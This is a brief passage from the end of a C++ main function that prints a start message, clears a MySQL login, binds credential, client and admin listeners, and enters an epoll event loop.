    std::cout << "Started." << std::endl;

    mysql_clear_login();

    cred_bind();

    client_bind();

    admin_bind();

    

    epoll_handler();

    return 0;
}
